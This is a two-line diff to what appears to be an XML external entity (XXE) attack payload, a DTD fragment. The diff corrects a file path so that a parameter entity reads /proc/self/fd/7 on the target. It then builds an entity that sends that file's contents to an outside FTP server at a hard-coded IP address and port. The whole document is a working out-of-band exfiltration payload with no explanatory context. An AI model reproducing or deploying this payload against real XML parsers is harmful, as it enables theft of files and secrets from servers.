@@ -1,2 +1,2 @@
-<!ENTITY % d SYSTEM "file:////proc/self/fd/7">
+<!ENTITY % d SYSTEM "file:///proc/self/fd/7">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://81.56.10.201:2121/%d;'>">
